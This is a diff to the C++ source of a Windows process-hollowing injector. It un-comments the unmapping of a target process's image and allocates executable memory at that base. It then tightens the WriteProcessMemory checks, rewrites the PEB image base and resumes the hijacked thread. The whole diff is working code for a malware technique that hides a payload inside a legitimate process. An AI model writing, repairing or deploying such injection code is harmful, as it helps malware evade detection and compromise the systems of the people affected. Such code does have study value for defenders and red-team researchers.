@@ -10,17 +10,17 @@
 Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string& payloadPath) :
     HollowingFunctions(targetPath, payloadPath)
 {
-    if ((_isPayload64Bit || _isTarget64Bit) && !IsWindows64Bit())
-        {
-            std::cout << "Cannot work with 64 bit images on a 32 bit Windows build!" << std::endl;
-            throw ""; // Replace with an exception class
-        }
+    if (!AreProcessesCompatible())
+    {   
+        std::cout << "The processes are incompatible!" << std::endl;
+        throw ""; // Replace with an exception class
+    }
 
-        if (!AreProcessesCompatible())
-        {   
-            std::cout << "The processes are not compatible!" << std::endl;
-            throw ""; // Replace with an exception class
-        }
+    if (!IsWindows64Bit())
+    {
+        std::cout << "Cannot work with 64 bit images on a 32 bit Windows build!" << std::endl;
+        throw ""; // Replace with an exception class
+    }
 }
 
 void Hollowing64Bit::hollow()
@@ -32,12 +32,12 @@ void Hollowing64Bit::hollow()
     IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
     IMAGE_NT_HEADERS64 payloadNTHeaders = *((PIMAGE_NT_HEADERS64)(_payloadBuffer + payloadDOSHeader.e_lfanew));
 
-    /* if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress))
+    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress))
     {
         std::cout << "206" << std::endl;
         // Exception
-    } */
-    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, nullptr,
+    }
+    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress,
         payloadNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(nullptr == targetNewBaseAddress)
     {
@@ -62,8 +62,6 @@ void Hollowing64Bit::hollow()
     std::cout << "Resuming the target's main thread" << std::endl;
     
     NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
-
-    delete[] _payloadBuffer;
 }
 
 void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
@@ -81,7 +79,7 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
-        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes))
+        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes) || writtenBytes != sourceNTHeaders.OptionalHeader.SizeOfHeaders)
     {
         std::cout << "213" << std::endl;
     }
@@ -225,7 +223,8 @@ void Hollowing64Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
     LPVOID pebImageBaseFieldAddress = (LPVOID)((LPBYTE)(targetBasicInformation.PebBaseAddress) + offsetof(PEB64, ImageBaseAddress));
 
     SIZE_T written = 0;
-    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, pebImageBaseFieldAddress, &processNewBaseAddress, sizeof(intptr_t), &written))
+    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, pebImageBaseFieldAddress, &processNewBaseAddress, sizeof(intptr_t), &written)
+        || sizeof(intptr_t) != written)
     {
         std::cout << "221" << std::endl;
     }
@@ -244,7 +243,6 @@ WORD Hollowing64Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
     PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer + dosHeader->e_lfanew);
     
     return ntHeaders->OptionalHeader.Subsystem;
-    
 }
 
 bool Hollowing64Bit::AreProcessesCompatible()
